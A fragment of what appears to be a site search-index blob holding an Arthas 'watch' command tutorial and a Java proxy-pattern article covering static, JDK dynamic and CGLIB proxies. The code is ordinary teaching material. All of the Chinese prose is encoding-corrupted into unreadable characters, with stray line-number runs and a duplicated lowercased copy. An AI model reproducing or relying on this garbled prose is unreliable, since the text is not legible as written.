åå¤§äº5ææ§è¡\n$ watch com.cloud.mqtt.web.testcontroller  test "{params[0],returnobj}" "params[0] > 5"\npress q or ctrl+c to abort.\naffect(class-cnt:1 , method-cnt:1) cost in 39 ms.\nts=2019-08-19 17:21:58; [cost=0.183399ms] result=@arraylist[\n    @string[6],\n    @string[63],\n]\n\nå¼å¸¸ä¿¡æ¯ä¸¾ä¾ï¼-e è¡¨ç¤ºæåºå¼å¸¸æ¶æè§¦åï¼expressä¸­ï¼è¡¨ç¤ºå¼å¸¸ä¿¡æ¯çåéæ¯throwexp\n$ watch demo.mathgame primefactors "{params[0],throwexp}" -e -x 2\npress ctrl+c to abort.\naffect(class-cnt:1 , method-cnt:1) cost in 62 ms.\nts=2018-12-03 19:38:00; [cost=1.414993ms] result=@arraylist[\n    @integer[-1120397038],\n    java.lang.illegalargumentexception: number is: -1120397038, need >= 2\n    at demo.mathgame.primefactors(mathgame.java:46)\n    at demo.mathgame.run(mathgame.java:24)\n    at demo.mathgame.main(mathgame.java:16),\n]\n\næç§èæ¶è¿è¡è¿æ»¤ï¼#cost>200(åä½æ¯ms)è¡¨ç¤ºåªæå½èæ¶å¤§äº200msæ¶æä¼è¾åºï¼è¿æ»¤ææ§è¡æ¶é´å°äº200msçè°ç¨\n$ watch demo.mathgame primefactors \'{params, returnobj}\' \'#cost>200\' -x 2\n$ watch demo.mathgame primefactors \'{params, returnobj}\' \'#cost>200\' -x 2\npress ctrl+c to abort.\naffect(class-cnt:1 , method-cnt:1) cost in 66 ms.\nts=2018-12-03 19:40:28; [cost=2112.168897ms] result=@arraylist[\n    @object[][\n        @integer[2141897465],\n    ],\n    @arraylist[\n        @integer[5],\n        @integer[428379493],\n    ],\n]\n\nè§å¯å½åå¯¹è±¡ä¸­çå±æ§ï¼å¦ææ³æ¥çæ¹æ³è¿è¡ååï¼å½åå¯¹è±¡ä¸­çå±æ§ï¼å¯ä»¥ä½¿ç¨targetå³é®å­ï¼ä»£è¡¨å½åå¯¹è±¡ï¼ç¶åä½¿ç¨target.field_nameè®¿é®å½åå¯¹è±¡çæä¸ªå±æ§\n$ watch com.cloud.mqtt.web.testcontroller  test \'target\'\npress q or ctrl+c to abort.\naffect(class-cnt:1 , method-cnt:1) cost in 47 ms.\nts=2019-08-19 17:27:09; [cost=0.450697ms] result=@testcontroller[\n    mqttgateway=@$proxy65[gateway proxy for service interface [interface com.cloud.mqtt.web.mqttgateway]],\n]\n\n$ watch com.cloud.mqtt.web.testcontroller  test \'target.mqttgateway\'\npress q or ctrl+c to abort.\naffect(class-cnt:1 , method-cnt:1) cost in 46 ms.\nts=2019-08-19 17:28:31; [cost=0.352704ms] result=@$proxy65[\n    m1=@method[public boolean java.lang.object.equals(java.lang.object)],\n    m10=@method[public abstract boolean org.springframework.aop.framework.advised.isexposeproxy()],\n    m13=@method[public abstract void org.springframework.aop.framework.advised.addadvisor(org.springframework.aop.advisor) throws org.springframework.aop.framework.aopconfigexception],\n    m7=@method[public abstract boolean org.springframework.aop.framework.advised.isproxytargetclass()],\n    m15=@method[public abstract void org.springframework.aop.framework.advised.removeadvisor(int) throws org.springframework.aop.framework.aopconfigexception],\n    m23=@method[public abstract java.lang.class[] org.springframework.aop.framework.advised.getproxiedinterfaces()],\n    m5=@method[public abstract int org.springframework.aop.framework.advised.indexof(org.springframework.aop.advisor)],\n    m22=@method[public abstract org.springframework.aop.targetsource org.springframework.aop.framework.advised.gettargetsource()],\n    m18=@method[public abstract void org.springframework.aop.framework.advised.addadvice(int,org.aopalliance.aop.advice) throws org.springframework.aop.framework.aopconfigexception],\n    m19=@method[public abstract void org.springframework.aop.framework.advised.addadvice(org.aopalliance.aop.advice) throws org.springframework.aop.framework.aopconfigexception],\n    m0=@method[public native int java.lang.object.hashcode()],\n    m24=@method[public abstract boolean org.springframework.aop.framework.advised.isinterfaceproxied(java.lang.class)],\n    m20=@method[public abstract boolean org.springframework.aop.framework.advised.removeadvice(org.aopalliance.aop.advice)],\n    m9=@method[public abstract void org.springframework.aop.framework.advised.setexposeproxy(boolean)],\n    m8=@method[public abstract void org.springframework.aop.framework.advised.settargetsource(org.springframework.aop.targetsource)],\n    m2=@method[public java.lang.string java.lang.object.tostring()],\n    m26=@method[public abstract java.lang.class org.springframework.aop.targetclassaware.gettargetclass()],\n    m14=@method[public abstract void org.springframework.aop.framework.advised.addadvisor(int,org.springframework.aop.advisor) throws org.springframework.aop.framework.aopconfigexception],\n    m27=@method[public abstract java.lang.class org.springframework.core.decoratingproxy.getdecoratedclass()],\n    m16=@method[public abstract boolean org.springframework.aop.framework.advised.removeadvisor(org.springframework.aop.advisor)],\n    m4=@method[public abstract int org.springframework.aop.framework.advised.indexof(org.aopalliance.aop.advice)],\n    m6=@method[public abstract boolean org.springframework.aop.framework.advised.isfrozen()],\n    m17=@method[public abstract boolean org.springframework.aop.framework.advised.replaceadvisor(org.springframework.aop.advisor,org.springframework.aop.advisor) throws org.springframework.aop.framework.aopconfigexception],\n    m11=@method[public abstract void org.springframework.aop.framework.advised.setprefiltered(boolean)],\n    m3=@method[public abstract void com.cloud.mqtt.web.mqttgateway.sendtomqtt(java.lang.string,java.lang.string)],\n    m21=@method[public abstract java.lang.string org.springframework.aop.framework.advised.toproxyconfigstring()],\n    m25=@method[public abstract org.springframework.aop.advisor[] org.springframework.aop.framework.advised.getadvisors()],\n    m12=@method[public abstract boolean org.springframework.aop.framework.advised.isprefiltered()],\n]\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n',charsets:{cjk:!0}},{title:"ä»£çæ¨¡å¼",frontmatter:{title:"ä»£çæ¨¡å¼",date:"2023-06-25T09:22:36.000Z",permalink:"/language/mode/1/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/03.%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html",relativePath:"00.è¯­è¨/03.è®¾è®¡æ¨¡å¼/1.è®¾è®¡æ¨¡å¼.md",key:"v-394fe5d6",path:"/language/mode/1/",headers:[{level:3,title:"éæä»£ç",slug:"éæä»£ç",normalizedTitle:"éæä»£ç",charIndex:125},{level:3,title:"å¨æä»£ç",slug:"å¨æä»£ç",normalizedTitle:"å¨æä»£ç",charIndex:130},{level:5,title:"JDKä»£ç",slug:"jdkä»£ç",normalizedTitle:"jdk ä»£ç",charIndex:2149},{level:5,title:"CGLIBä»£ç",slug:"cglibä»£ç",normalizedTitle:"cglib ä»£ç",charIndex:3929},{level:5,title:"åºå«",slug:"åºå«",normalizedTitle:"åºå«",charIndex:5459}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"éæä»£ç å¨æä»£ç JDKä»£ç CGLIBä»£ç åºå«",content:'Java ä¸­çä»£çæ¯ä¸ç§è®¾è®¡æ¨¡å¼ï¼å®åè®¸å¨ä¸æ¹ååå§å¯¹è±¡çæåµä¸ï¼éè¿å¼å¥ä¸ä¸ªä»£çå¯¹è±¡æ¥æ§å¶å¯¹åå§å¯¹è±¡çè®¿é®ãä»£çå¯¹è±¡åå½äºå®¢æ·ç«¯ä¸åå§å¯¹è±¡ä¹é´çä¸­ä»ï¼å¯ä»¥å¨è°ç¨åå§å¯¹è±¡çæ¹æ³ååæ§è¡ä¸äºé¢å¤çæä½ï¼å¦æéæ£æ¥ãæ¥å¿è®°å½ç­ã\n\nJava çä»£çä¸»è¦æéæä»£çåå¨æä»£çä¸¤ç§å®ç°æ¹å¼ãéæä»£çéè¦æå¨ç¼åä»£çç±»ï¼èå¨æä»£çåä½¿ç¨ Java æä¾çåå°æºå¶å¨æçæä»£çå¯¹è±¡ã\n\nä»£ççä½ç¨åæ¬ï¼\n\n * æ§å¶å¯¹åå§å¯¹è±¡çè®¿é®ï¼ä»£çå¯¹è±¡å¯ä»¥éå¶å®¢æ·ç«¯å¯¹åå§å¯¹è±¡çç´æ¥è®¿é®ï¼ä»èå¢å å®å¨æ§ã\n * å®ç°è¿ç¨è°ç¨ï¼ä»£çå¯¹è±¡å¯ä»¥å°æ¹æ³è°ç¨è½¬åå°å¦ä¸å°è®¡ç®æºä¸çå¯¹è±¡ï¼ä»èå®ç°è¿ç¨è°ç¨ã\n * å®ç°æå è½½ï¼ä»£çå¯¹è±¡å¯ä»¥å¨éè¦æ¶æåå»ºåå§å¯¹è±¡ï¼ä»èå®ç°æå è½½ï¼æé«ç³»ç»æ§è½ã\n * å®ç°äºå¡ç®¡çï¼ä»£çå¯¹è±¡å¯ä»¥å¨è°ç¨åå§å¯¹è±¡çæ¹æ³ååè¿è¡äºå¡æä½ï¼ä»èå®ç°äºå¡ç®¡çã\n\n\n# éæä»£ç\n\nå¨éæä»£çä¸­ï¼ä»£çç±»ååå§ç±»å®ç°äºç¸åçæ¥å£ï¼å®¢æ·ç«¯éè¿ä»£çç±»è®¿é®åå§ç±»çæ¹æ³ã\n\nä½¿ç¨ Java éæä»£çæä»¥ä¸å ä¸ªæ­¥éª¤ï¼\n\n 1. åå»ºä¸ä¸ªæ¥å£ï¼å®ä¹åå§å¯¹è±¡åä»£çå¯¹è±¡é½è¦å®ç°çæ¹æ³ï¼\n 2. åå»ºä¸ä¸ªåå§å¯¹è±¡çå®ç°ç±»ï¼å¹¶å®ç°æ¥å£ä¸­çæ¹æ³ï¼\n 3. åå»ºä¸ä¸ªä»£çç±»ï¼å®ç°æ¥å£å¹¶ææåå§å¯¹è±¡çå¼ç¨ï¼\n 4. å¨ä»£çç±»çæ¹æ³ä¸­ï¼è°ç¨åå§å¯¹è±¡çæ¹æ³ï¼å¹¶å¨è°ç¨ååæ§è¡éè¦çé¢å¤æä½ï¼\n 5. å¨å®¢æ·ç«¯ä»£ç ä¸­ï¼åå»ºä¸ä¸ªä»£çå¯¹è±¡ï¼è°ç¨ä»£çå¯¹è±¡çæ¹æ³å³å¯ã\n\n// æ¥å£\npublic interface Subject {\n    void request();\n}\n\n// åå§å¯¹è±¡\npublic class RealSubject implements Subject {\n    public void request() {\n        System.out.println("RealSubject: Handling request.");\n    }\n}\n\n// ä»£çç±»\npublic class Proxy implements Subject {\n    private RealSubject realSubject;\n    \n    public Proxy(RealSubject realSubject) {\n        this.realSubject = realSubject;\n    }\n    \n    public void request() {\n        System.out.println("Proxy: Logging before request.");\n        realSubject.request();\n        System.out.println("Proxy: Logging after request.");\n    }\n}\n\n// å®¢æ·ç«¯ä»£ç \npublic class Client {\n    public static void main(String[] args) {\n        RealSubject realSubject = new RealSubject();\n        Proxy proxy = new Proxy(realSubject);\n        proxy.request();\n    }\n}\n// ç»æ\nProxy: Logging before request.\nRealSubject: Handling request.\nProxy: Logging after request.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# å¨æä»£ç\n\nJava å¨æä»£çæ¯ä¸ç§ä½¿ç¨åå°æºå¶å¨è¿è¡æ¶å¨æå°çæä»£çç±»çææ¯ï¼å¯ä»¥ç¨æ¥ä»£çä¸ä¸ªæå¤ä¸ªæ¥å£çå®ç°ç±»ï¼å¹¶å¨ä»£çå¯¹è±¡è°ç¨æ¹æ³æ¶è¿è¡é¢å¤çæä½ã\n\nJava å¨æä»£çæä¸¤ç§å®ç°æ¹å¼ï¼åºäºæ¥å£çå¨æä»£çï¼JDKï¼ååºäºç±»çå¨æä»£çï¼CGLIBï¼ã\n\n * åºäºæ¥å£çå¨æä»£çï¼JDKï¼ï¼æ¯æä»£çå¯¹è±¡å®ç°ï¼æç»§æ¿ï¼äºè¢«ä»£çå¯¹è±¡å®ç°çæ¥å£ï¼ä»£çå¯¹è±¡éè¿æ¥å£ä¸­çæ¹æ³æ¥å®ç°å¯¹è¢«ä»£çå¯¹è±¡çä»£çãè¿ç§æ¹å¼æ´çµæ´»ãå®å¨åä½è¦åï¼å ä¸ºä»£çå¯¹è±¡åè¢«ä»£çå¯¹è±¡ä¹é´åªéè¦å±åå®ç°ä¸ä¸ªæ¥å£å³å¯ã\n * èåºäºç±»çå¨æä»£çï¼CGLIBï¼ï¼æ¯æä»£çå¯¹è±¡åè¢«ä»£çå¯¹è±¡æ²¡æå±åå®ç°çæ¥å£ï¼ä½ä»£çå¯¹è±¡æ¯è¢«ä»£çå¯¹è±¡çå­ç±»ï¼å æ­¤å¯ä»¥è¦çè¢«ä»£çå¯¹è±¡çæ¹æ³å¹¶å¨å¶ä¸­å®ç°å¯¹è¢«ä»£çå¯¹è±¡çä»£çãè¿ç§æ¹å¼ç¸å¯¹äºåºäºæ¥å£çå¨æä»£çæ¥è¯´æ´çµæ´»ï¼å ä¸ºä»£çå¯¹è±¡ä¸åè¢«ä»£çå¯¹è±¡çæ¥å£éå¶ï¼å¯ä»¥ä»£çä»»æç±»çä»»ææ¹æ³ï¼ä½æ¯å®ä¹å¸¦æ¥äºä¸äºé®é¢ï¼ä¾å¦ä»£çå¯¹è±¡æ æ³åæ¶ä»£çå¤ä¸ªç±»ï¼ä»¥åå¯è½ä¼ç ´åè¢«ä»£çå¯¹è±¡çå°è£æ§åå®å¨æ§ã\n\nJava å¨æä»£ççä½ç¨åæ¬ä½ä¸éäºï¼\n\n * å®ç° AOPï¼é¢ååé¢ç¼ç¨ï¼çåè½ï¼å¦æ¥å¿è®°å½ãæ§è½ç»è®¡ç­ï¼\n * éèæäºç±»ææ¹æ³çå·ä½å®ç°ç»èï¼\n * å®ç° RPCï¼è¿ç¨è¿ç¨è°ç¨ï¼ç­åè½ã\n\n# JDK ä»£ç\n\nä½¿ç¨ Java å¨æä»£çéè¦éµå¾ªä»¥ä¸æ­¥éª¤ï¼\n\n 1. å®ä¹ä¸ä¸ªæ¥å£ï¼\n 2. ç¼åä¸ä¸ªå®ç°è¯¥æ¥å£çç±»ï¼\n 3. åå»ºä¸ä¸ª InvocationHandler å¯¹è±¡ï¼å¹¶å®ç° invoke () æ¹æ³ï¼å¨è¯¥æ¹æ³ä¸­å¯¹è¢«ä»£çå¯¹è±¡çæ¹æ³è¿è¡å¢å¼ºï¼\n 4. éè¿ Proxy.newProxyInstance () æ¹æ³åå»ºä»£çå¯¹è±¡ãè¯¥æ¹æ³éè¦ä¼ å¥ä¸ä¸ªåæ°ï¼ClassLoader å¯¹è±¡ãä»£çå¯¹è±¡è¦å®ç°çæ¥å£æ°ç»ãInvocationHandler å¯¹è±¡ï¼\n 5. è°ç¨ä»£çå¯¹è±¡çæ¹æ³ï¼å®éä¸ä¼è°ç¨ InvocationHandler ç invoke () æ¹æ³ã\n\n// æ¥å£\npublic interface Subject {\n    void request();\n}\n\n// å®ç°ç±»\npublic class RealSubject implements Subject {\n    public void request() {\n        System.out.println("RealSubject: Handling request.");\n    }\n}\n\n// InvocationHandler\npublic class MyInvocationHandler implements InvocationHandler {\n    private Object realObject;\n    \n    public MyInvocationHandler(Object realObject) {\n        this.realObject = realObject;\n    }\n\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n        System.out.println("MyInvocationHandler: Logging before request.");\n        Object result = method.invoke(realObject, args);\n        System.out.println("MyInvocationHandler: Logging after request.");\n        return result;\n    }\n}\n\n// å®¢æ·ç«¯ä»£ç \npublic class Client {\n    public static void main(String[] args) {\n        RealSubject realSubject = new RealSubject();\n        MyInvocationHandler handler = new MyInvocationHandler(realSubject);\n        // åå»ºä»£çå¯¹è±¡\n        Subject proxy = (Subject)Proxy.newProxyInstance(\n            realSubject.getClass().getClassLoader(),\n            realSubject.getClass().getInterfaces(),\n            handler);\n        // è°ç¨ä»£çå¯¹è±¡çæ¹æ³\n        proxy.request();\n    }\n}\n// ç»æ\nMyInvocationHandler: Logging before request.\nRealSubject: Handling request.\nMyInvocationHandler: Logging after request.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n# CGLIB ä»£ç\n\nCGLIB æ¯ä¸ä¸ªå¼ºå¤§ç Java å­èç çæåºï¼è½å¤å¨è¿è¡æ¶å¨æå°çæä»£çå¯¹è±¡ãä¸åºäºæ¥å£çå¨æä»£çä¸åï¼CGLIB å¨æä»£çå¯ä»¥ä»£çæ²¡æå®ç°æ¥å£çç±»ã\n\nä½¿ç¨ CGLIB å¨æä»£çéè¦ä¾èµ cglib åºï¼å¯ä»¥éè¿ Maven ç­æå»ºå·¥å·å¼å¥ãä¸é¢æ¯ä¸ä¸ªç®åçä½¿ç¨ CGLIB å¨æä»£ççç¤ºä¾ï¼\n\n 1. å®ä¹ä¸ä¸ªéè¦ä»£ççç±» Personï¼å¹¶å®ä¹å¶ç¸å³æ¹æ³ã\n\npublic class Person {\n    public void eat() {\n        System.out.println("Person: Eating");\n    }\n\n    public void sleep() {\n        System.out.println("Person: Sleeping");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 2. åå»ºä¸ä¸ª MethodInterceptor å¯¹è±¡ï¼å¨ intercept () æ¹æ³ä¸­å®ç°å¯¹è¢«ä»£çå¯¹è±¡æ¹æ³çå¢å¼ºã\n\nimport net.sf.cglib.proxy.MethodInterceptor;\nimport net.sf.cglib.proxy.MethodProxy;\n\nimport java.lang.reflect.Method;\n\npublic class MyMethodInterceptor implements MethodInterceptor {\n    @Override\n    public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable {\n        System.out.println("Before " + method.getName());\n        Object result = proxy.invokeSuper(obj, args);\n        System.out.println("After " + method.getName());\n        return result;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n 3. ä½¿ç¨ CGLIB åå»ºä»£çå¯¹è±¡ï¼å¹¶è°ç¨ä»£çå¯¹è±¡çæ¹æ³ã\n\nimport net.sf.cglib.proxy.Enhancer;\n\npublic class Main {\n    public static void main(String[] args) {\n        Enhancer enhancer = new Enhancer();\n        enhancer.setSuperclass(Person.class);\n        enhancer.setCallback(new MyMethodInterceptor());\n\n        Person person = (Person)enhancer.create();\n        person.eat();\n        person.sleep();\n    }\n}\n// ç»æ\nBefore eat\nPerson: Eating\nAfter eat\nBefore sleep\nPerson: Sleeping\nAfter sleep\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# åºå«\n\nåºäº CGLIB å JDK å¨æä»£çåæä¼ç¼ºç¹ï¼åå³äºå·ä½çåºç¨åºæ¯åéæ±ãå·ä½ä¼ç¼ºç¹å¦ä¸ï¼\nä¼ç¹ï¼\n\nCGLIB                      JDK\nå¯ä»¥ä»£çæ²¡æå®ç°æ¥å£çç±»               ä¸éè¦ä¾èµé¢å¤çåº\nçæçä»£çç±»æ¯è¾å°ï¼æ§è¡æçé«            éç¨çæ¯æ¥å£ä»£çï¼æ´å çµæ´»åå®å¨\næ¯ææ¹æ³çº§å«çæ¦æªï¼å¯ä»¥å¯¹ç±»ä¸­çä»»ææ¹æ³è¿è¡æ¦æª   å¨ Java 1.3 åä»¥ä¸çæ¬ä¸­å¯ä»¥ç´æ¥ä½¿ç¨ï¼æäºé¨ç½²åç»´æ¤\n\nç¼ºç¹ï¼\n\nCGLIB                           JDK\nå¯¹äº final æ¹æ³æ private æ¹æ³æ æ³è¿è¡ä»£ç   åªè½ä»£çå®ç°äºæ¥å£çç±»\nç±äºä½¿ç¨ç»§æ¿å®ç°ä»£çï¼å¯è½ä¼ç ´åè¢«ä»£çå¯¹è±¡çå°è£æ§åå®å¨æ§   çæçä»£çç±»ç¸å¯¹è¾å¤§ï¼æ§è¡æçä¸å¦åºäº Java å­èç çæåºçä»£ç\nçæçä»£çç±»éè¦ä¾èµé¢å¤çåº                  åªè½å¯¹æ¥å£ä¸­çæ¹æ³è¿è¡æ¦æª',normalizedContent:'java ä¸­çä»£çæ¯ä¸ç§è®¾è®¡æ¨¡å¼ï¼å®åè®¸å¨ä¸æ¹ååå§å¯¹è±¡çæåµä¸ï¼éè¿å¼å¥ä¸ä¸ªä»£çå¯¹è±¡æ¥æ§å¶å¯¹åå§å¯¹è±¡çè®¿é®ãä»£çå¯¹è±¡åå½äºå®¢æ·ç«¯ä¸åå§å¯¹è±¡ä¹é´çä¸­ä»ï¼å¯ä»¥å¨è°ç¨åå§å¯¹è±¡çæ¹æ³ååæ§è¡ä¸äºé¢å¤çæä½ï¼å¦æéæ£æ¥ãæ¥å¿è®°å½ç­ã\n\njava çä»£çä¸»è¦æéæä»£çåå¨æä»£çä¸¤ç§å®ç°æ¹å¼ãéæä»£çéè¦æå¨ç¼åä»£çç±»ï¼èå¨æä»£çåä½¿ç¨ java æä¾çåå°æºå¶å¨æçæä»£çå¯¹è±¡ã\n\nä»£ççä½ç¨åæ¬ï¼\n\n * æ§å¶å¯¹åå§å¯¹è±¡çè®¿é®ï¼ä»£çå¯¹è±¡å¯ä»¥éå¶å®¢æ·ç«¯å¯¹åå§å¯¹è±¡çç´æ¥è®¿é®ï¼ä»èå¢å å®å¨æ§ã\n * å®ç°è¿ç¨è°ç¨ï¼ä»£çå¯¹è±¡å¯ä»¥å°æ¹æ³è°ç¨è½¬åå°å¦ä¸å°è®¡ç®æºä¸çå¯¹è±¡ï¼ä»èå®ç°è¿ç¨è°ç¨ã\n * å®ç°æå è½½ï¼ä»£çå¯¹è±¡å¯ä»¥å¨éè¦æ¶æåå»ºåå§å¯¹è±¡ï¼ä»èå®ç°æå è½½ï¼æé«ç³»ç»æ§è½ã\n * å®ç°äºå¡ç®¡çï¼ä»£çå¯¹è±¡å¯ä»¥å¨è°ç¨åå§å¯¹è±¡çæ¹æ³ååè¿è¡äºå¡æä½ï¼ä»èå®ç°äºå¡ç®¡çã\n\n\n# éæä»£ç\n\nå¨éæä»£çä¸­ï¼ä»£çç±»ååå§ç±»å®ç°äºç¸åçæ¥å£ï¼å®¢æ·ç«¯éè¿ä»£çç±»è®¿é®åå§ç±»çæ¹æ³ã\n\nä½¿ç¨ java éæä»£çæä»¥ä¸å ä¸ªæ­¥éª¤ï¼\n\n 1. åå»ºä¸ä¸ªæ¥å£ï¼å®ä¹åå§å¯¹è±¡åä»£çå¯¹è±¡é½è¦å®ç°çæ¹æ³ï¼\n 2. åå»ºä¸ä¸ªåå§å¯¹è±¡çå®ç°ç±»ï¼å¹¶å®ç°æ¥å£ä¸­çæ¹æ³ï¼\n 3. åå»ºä¸ä¸ªä»£çç±»ï¼å®ç°æ¥å£å¹¶ææåå§å¯¹è±¡çå¼ç¨ï¼\n 4. å¨ä»£çç±»çæ¹æ³ä¸­ï¼è°ç¨åå§å¯¹è±¡çæ¹æ³ï¼å¹¶å¨è°ç¨ååæ§è¡éè¦çé¢å¤æä½ï¼\n 5. å¨å®¢æ·ç«¯ä»£ç ä¸­ï¼åå»ºä¸ä¸ªä»£çå¯¹è±¡ï¼è°ç¨ä»£çå¯¹è±¡çæ¹æ³å³å¯ã\n\n// æ¥å£\npublic interface subject {\n    void request();\n}\n\n// åå§å¯¹è±¡\npublic class realsubject implements subject {\n    public void request() {\n        system.out.println("realsubject: handling request.");\n    }\n}\n\n// ä»£çç±»\npublic class proxy implements subject {\n    private realsubject realsubject;\n    \n    public proxy(realsubject realsubject) {\n        this.realsubject = realsubject;\n    }\n    \n    public void request() {\n        system.out.println("proxy: logging before request.");\n        realsubject.request();\n        system.out.println("proxy: logging after request.");\n    }\n}\n\n// å®¢æ·ç«¯ä»£ç \npublic class client {\n    public static void main(string[] args) {\n        realsubject realsubject = new realsubject();\n        proxy proxy = new proxy(realsubject);\n        proxy.request();\n    }\n}\n// ç»æ\nproxy: logging before request.\nrealsubject: handling request.\nproxy: logging after request.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# å¨æä»£ç\n\njava å¨æä»£çæ¯ä¸ç§ä½¿ç¨åå°æºå¶å¨è¿è¡æ¶å¨æå°çæä»£çç±»çææ¯ï¼å¯ä»¥ç¨æ¥ä»£çä¸ä¸ªæå¤ä¸ªæ¥å£çå®ç°ç±»ï¼å¹¶å¨ä»£çå¯¹è±¡è°ç¨æ¹æ³æ¶è¿è¡é¢å¤çæä½ã\n\njava å¨æä»£çæä¸¤ç§å®ç°æ¹å¼ï¼åºäºæ¥å£çå¨æä»£çï¼jdkï¼ååºäºç±»çå¨æä»£çï¼cglibï¼ã\n\n * åºäºæ¥å£çå¨æä»£çï¼jdkï¼ï¼æ¯æä»£çå¯¹è±¡å®ç°ï¼æç»§æ¿ï¼äºè¢«ä»£çå¯¹è±¡å®ç°çæ¥å£ï¼ä»£çå¯¹è±¡éè¿æ¥å£ä¸­çæ¹æ³æ¥å®ç°å¯¹è¢«ä»£çå¯¹è±¡çä»£çãè¿ç§æ¹å¼æ´çµæ´»ãå®å¨åä½è¦åï¼å ä¸ºä»£çå¯¹è±¡åè¢«ä»£çå¯¹è±¡ä¹é´åªéè¦å±åå®ç°ä¸ä¸ªæ¥å£å³å¯ã\n * èåºäºç±»çå¨æä»£çï¼cglibï¼ï¼æ¯æä»£çå¯¹è±¡åè¢«ä»£çå¯¹è±¡æ²¡æå±åå®ç°çæ¥å£ï¼ä½ä»£çå¯¹è±¡æ¯è¢«ä»£çå¯¹è±¡çå­ç±»ï¼å æ­¤å¯ä»¥è¦çè¢«ä»£çå¯¹è±¡çæ¹æ³å¹¶å¨å¶ä¸­å®ç°å¯¹è¢«ä»£çå¯¹è±¡çä»£çãè¿ç§æ¹å¼ç¸å¯¹äºåºäºæ¥å£çå¨æä»£çæ¥è¯´æ´çµæ´»ï¼å ä¸ºä»£çå¯¹è±¡ä¸åè¢«ä»£çå¯¹è±¡çæ¥å£éå¶ï¼å¯ä»¥ä»£çä»»æç±»çä»»ææ¹æ³ï¼ä½æ¯å®ä¹å¸¦æ¥äºä¸äºé®é¢ï¼ä¾å¦ä»£çå¯¹è±¡æ æ³åæ¶ä»£çå¤ä¸ªç±»ï¼ä»¥åå¯è½ä¼ç ´åè¢«ä»£çå¯¹è±¡çå°è£æ§åå®å¨æ§ã\n\njava å¨æä»£ççä½ç¨åæ¬ä½ä¸éäºï¼\n\n * å®ç° aopï¼é¢ååé¢ç¼ç¨ï¼çåè½ï¼å¦æ¥å¿è®°å½ãæ§è½ç»è®¡ç­ï¼\n * éèæäºç±»ææ¹æ³çå·ä½å®ç°ç»èï¼\n * å®ç° rpcï¼è¿ç¨è¿ç¨è°ç¨ï¼ç­åè½ã\n\n# jdk ä»£ç\n\nä½¿ç¨ java å¨æä»£çéè¦éµå¾ªä»¥ä¸æ­¥éª¤ï¼\n\n 1. å®ä¹ä¸ä¸ªæ¥å£ï¼\n 2. ç¼åä¸ä¸ªå®ç°è¯¥æ¥å£çç±»ï¼\n 3. åå»ºä¸ä¸ª invocationhandler å¯¹è±¡ï¼å¹¶å®ç° invoke () æ¹æ³ï¼å¨è¯¥æ¹æ³ä¸­å¯¹è¢«ä»£çå¯¹è±¡çæ¹æ³è¿è¡å¢å¼ºï¼\n 4. éè¿ proxy.newproxyinstance () æ¹æ³åå»ºä»£çå¯¹è±¡ãè¯¥æ¹æ³éè¦ä¼ å¥ä¸ä¸ªåæ°ï¼classloader å¯¹è±¡ãä»£çå¯¹è±¡è¦å®ç°çæ¥å£æ°ç»ãinvocationhandler å¯¹è±¡ï¼\n 5. è°ç¨ä»£çå¯¹è±¡çæ¹æ³ï¼å®éä¸ä¼è°ç¨ invocationhandler ç invoke () æ¹æ³ã\n\n// æ¥å£\npublic interface subject {\n    void request();\n}\n\n// å®ç°ç±»\npublic class realsubject implements subject {\n    public void request() {\n        system.out.println("realsubject: handling request.");\n    }\n}\n\n// invocationhandler\npublic class myinvocationhandler implements invocationhandler {\n    private object realobject;\n    \n    public myinvocationhandler(object realobject) {\n        this.realobject = realobject;\n    }\n\n    @override\n    public object invoke(object proxy, method method, object[] args) throws throwable {\n        system.out.println("myinvocationhandler: logging before request.");\n        object result = method.invoke(realobject, args);\n        system.out.println("myinvocationhandler: logging after request.");\n        return result;\n    }\n}\n\n// å®¢æ·ç«¯ä»£ç \npublic class client {\n    public static void main(string[] args) {\n        realsubject realsubject = new realsubject();\n        myinvocationhandler handler = new myinvocationhandler(realsubject);\n        // åå»ºä»£çå¯¹è±¡\n        subject proxy = (subject)proxy.newproxyinstance(\n            realsubject.getclass().getclassloader(),\n            realsubject.getclass().getinterfaces(),\n            handler);\n        // è°ç¨ä»£çå¯¹è±¡çæ¹æ³\n        proxy.request();\n    }\n}\n// ç»æ\nmyinvocationhandler: logging before request.\nrealsubject: handling request.\nmyinvocationhandler: logging after 